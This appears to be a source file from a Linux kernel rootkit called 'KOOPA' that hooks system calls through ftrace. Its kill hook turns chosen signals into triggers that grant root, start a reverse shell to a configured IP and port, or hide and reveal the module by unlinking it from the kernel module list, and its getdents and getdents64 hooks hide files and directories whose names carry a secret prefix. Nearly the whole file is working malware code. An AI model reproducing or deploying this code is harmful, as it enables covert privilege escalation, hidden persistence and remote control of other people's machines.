#include "../include/hookers.h"
#include "../include/utils.h"
#include "../include/CONFIG.h"

asmlinkage long (*orig_mkdir)(const struct pt_regs*);
asmlinkage int hook_mkdir(const struct pt_regs *regs){
    char __user *pathname = (char *)regs->di;
   
    char dir_name[NAME_MAX] = {0};
    long err;

    printk(KERN_INFO "KOOPA:: mkdir hooked x64!");
    err = strncpy_from_user(dir_name, pathname, NAME_MAX);
    if (err>0){
        printk(KERN_INFO "KOOPA:: Detected mkdir %s\n", dir_name);
    }

    orig_mkdir(regs);
    return 0;
}

static int rootkit_visibility = 1;
static struct list_head *prev_module;

void hide_rootkit(void){
    printk(KERN_INFO "KOOPA:: Module hidden.\n");
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    rootkit_visibility = 0;
}

void show_rootkit(void){
    printk(KERN_INFO "KOOPA:: Module visible.\n");
    list_add(&THIS_MODULE->list, prev_module);
    rootkit_visibility = 1;
}

asmlinkage long (*orig_kill)(const struct pt_regs*);
asmlinkage int hook_kill(const struct pt_regs *regs){
    void set_root(void);
    int sig = regs->si;
    if (sig == SIGNAL_KILL_HOOK){
        printk(KERN_INFO "KOOPA:: Giving root privileges.\n");
        change_self_privileges_to_root();
        return orig_kill(regs);
    }else if(sig == SIGNAL_REVERSE_SHELL){
        start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
    }else if(sig == SIGNAL_SHOW_KERNEL_MODULE){
        if(rootkit_visibility == 1){
            printk(KERN_INFO "KOOPA:: Requested visibility, but already visible.\n");
            return orig_kill(regs);
        }
        show_rootkit();
    }else if(sig == SIGNAL_HIDE_KERNEL_MODULE){
        if(rootkit_visibility == 0){
            printk(KERN_INFO "KOOPA:: Requested hiding, but already hidden.\n");
            return orig_kill(regs);
        }
        hide_rootkit();
    }

    return orig_kill(regs);
}

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
asmlinkage int hook_getdents64(const struct pt_regs *regs){
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *prev_dir, *current_dir, *dirent_ker = NULL;
    long err;
    int ret;
    
    unsigned long offset = 0;
    ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if (ret<=0 || dirent_ker==NULL){
        return ret;
    }

    err = copy_from_user(dirent_ker, dirent, ret);
    if(err){
        kfree(dirent_ker);
        return ret;
    }

    while (offset < ret){
        current_dir = (void *)dirent_ker + offset;

        if(memcmp(KOOPA_DIRECTORY_PREFIX, current_dir->d_name, strlen(KOOPA_DIRECTORY_PREFIX))==0){
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            prev_dir->d_reclen += current_dir->d_reclen;
            printk(KERN_INFO "KOOPA:: Skipped over secret entry.\n");
        }else{
            prev_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }
    err = copy_to_user(dirent, dirent_ker, ret);
    if(err){
        kfree(dirent_ker);
    }

    return ret;
}

struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
};
static asmlinkage long (*orig_getdents)(const struct pt_regs *);
asmlinkage int hook_getdents(const struct pt_regs *regs){
    struct linux_dirent __user *dirent = (struct linux_dirent *)regs->si;
    struct linux_dirent *prev_dir, *current_dir, *dirent_ker = NULL;
    long err;
    int ret;
    unsigned long offset = 0;
    ret = orig_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if (ret<=0 || dirent_ker==NULL){
        return ret;
    }
        
    err = copy_from_user(dirent_ker, dirent, ret);
    if(err){
        kfree(dirent_ker);
        return ret;
    }

    while (offset < ret){
        current_dir = (void *)dirent_ker + offset;

        if(memcmp(KOOPA_DIRECTORY_PREFIX, current_dir->d_name, strlen(KOOPA_DIRECTORY_PREFIX))==0){
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
     
            prev_dir->d_reclen += current_dir->d_reclen;
            printk(KERN_INFO "KOOPA:: Skipped over secret entry.\n");
        }else{
            prev_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }
    err = copy_to_user(dirent, dirent_ker, ret);
    if(err){
        kfree(dirent_ker);
    }
    return ret;
}

struct ftrace_hook hooks[] = {
    HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
    HOOK("sys_kill", hook_kill, &orig_kill),
    HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("sys_getdents", hook_getdents, &orig_getdents)
};

void remove_all_hooks(void){
    remove_hooks_set(hooks, ARRAY_SIZE(hooks));
}

int install_all_hooks(void){
    return install_hooks_set(hooks, ARRAY_SIZE(hooks));
}
